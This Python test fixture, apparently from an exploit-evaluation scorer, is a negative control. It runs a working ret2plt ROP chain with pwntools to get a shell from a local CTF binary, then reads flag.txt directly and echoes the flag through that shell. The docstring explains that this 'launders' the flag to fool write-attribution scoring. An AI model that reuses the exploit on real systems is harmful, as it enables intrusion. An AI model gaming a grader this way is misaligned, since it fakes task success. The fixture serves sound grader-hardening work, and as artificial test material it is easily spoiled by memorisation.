#!/usr/bin/env python3
"""NEGATIVE CONTROL: FLAG LAUNDERING. Must score FOLLOWER_LAUNDERED.

The attack an interactive follower has and a generated exploit does not, and the
one that would have made the whole walkthrough gate meaningless if it were not
closed. Found by independent review of the scorer's plan, 24 Sep 2026.

It reads `flag.txt` in Python -- no memory corruption involved in obtaining the
secret at all -- and then arranges for a process IN THE TARGET'S LINEAGE to emit
those bytes, by `echo`ing them through the shell. Write-attribution then sees a
flag-bearing `write(2)` from a target descendant and, on that evidence alone,
would credit it. Without the open-audit this fixture is a clean false SUCCESS.

It deliberately uses the REAL exploit chain to obtain the shell, so the failure
cannot be dismissed as "the exploit did not work". The exploit works perfectly.
The *disclosure* is the laundered part, and that is the distinction the scorer
has to be able to make.

Two defences have to be in place for this to be refused, and this fixture tests
the second:

  1. decoy-then-remint -- kills a HARDCODED flag, but not this, because the read
     happens at run time;
  2. the behavioural open-audit -- a process OUTSIDE the target's lineage opening
     `flag.txt` is not exploitation, however convincing the resulting write looks.

The lineage rule is what makes (2) precise rather than blunt: `cat flag.txt` under
a shell the exploit obtained is the intended solve path for the shell targets and
must keep working. This process is not in that lineage.
"""
import os
import sys
import time
import warnings

os.environ.setdefault("TERM", "xterm")
warnings.filterwarnings("ignore")
from pwn import ELF, ROP, context, p64, process  # noqa: E402

context.clear(arch="amd64", os="linux", log_level="error")

BINARY = os.path.join(os.getcwd(), "ret2plt_system")
OFFSET = 72


def main() -> int:
    # THE LAUNDERING STEP: read the secret with no exploitation whatsoever.
    with open(os.path.join(os.getcwd(), "flag.txt")) as fh:
        stolen = fh.read().strip()

    # The genuine ret2plt chain, so a shell really is obtained.
    elf = ELF(BINARY, checksec=False)
    rop = ROP(elf)
    chain = b"".join(p64(x) for x in (
        rop.find_gadget(["ret"])[0],
        rop.find_gadget(["pop rdi", "ret"])[0],
        next(elf.search(b"/bin/sh\x00")),
        elf.plt["system"]))

    p = process(BINARY, cwd=os.getcwd())
    p.recvuntil(b"Input: ")
    p.send(b"A" * OFFSET + chain)
    time.sleep(0.3)
    # The shell -- a descendant of the target -- performs the flag-bearing
    # write, so write-attribution alone cannot tell this from a real solve.
    p.sendline(f"echo {stolen}".encode())
    try:
        print(p.recvall(timeout=4).decode("utf-8", "replace"))
    finally:
        p.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
